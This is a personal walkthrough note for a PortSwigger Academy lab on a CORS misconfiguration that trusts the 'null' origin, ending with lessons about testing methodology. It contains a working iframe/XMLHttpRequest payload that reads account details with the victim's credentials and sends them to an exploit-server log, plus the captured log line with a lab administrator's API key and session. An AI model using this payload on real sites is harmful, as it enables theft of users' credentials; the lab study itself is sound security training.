resource: 
- [lab and concept](https://youtu.be/RKe6r63OxXw)
- [medium writeup](https://medium.com/@relzy/day-4-of-portswigger-academy-lab-walkthrough-cors-xxe-injection-6c7d85302e86)

Again checked whether the browser implemented the CORS 
![[Pasted image 20260903232134.png]]

Now sent the request to repeater to check for CORS Misconfiguration by adding
`Origin: null` as mentioned in the lab.
![[Pasted image 20260903232315.png]]

Time for the exploit using JavaScript

payload:
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script> 
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://0aab00970407a05c806276a400f000fa.web-security-academy.net/accountDetails',true); req.withCredentials = true; 
req.send(); 
function reqListener() { location='https://exploit-0a0000520446a0f58028755f01750053.exploit-server.net/log?key='+encodeURIComponent(this.responseText); 
}; 
</script>"></iframe>

![[Pasted image 20260903233222.png]]
`"GET /log?key=%7B%0A%20%20%22username%22%3A%20%22administrator%22%2C%0A%20%20%22email%22%3A%20%22%22%2C%0A%20%20%22apikey%22%3A%20%22otg4wcODGqO1RmbPpCcSHJEvzkal8zK9%22%2C%0A%20%20%22sessions%22%3A%20%5B%0A%20%20%20%20%22hBYiIVTbrf0wmOHgAZ2fEshh8k556sZ6%22%0A%20%20%5D%0A%7D HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"`

Got the api key again. Hurray!!!

###### Learnings:
I made a rookie mistake here of not checking whether the browser allows `Access-Control-Allow-Origin: htts://sha-bang.com` and went directly for `Access-Control-Allow-Origin: null` 

So the learning here was that I needed to check for every possible misconfiguration not just the `allow origin: null`  as mentioned in the lab. Need to think as a black box tester with no knowledge of the system and check for every possible vulnerability.

You can also check for `Access-Control-Allow-Origin: *`

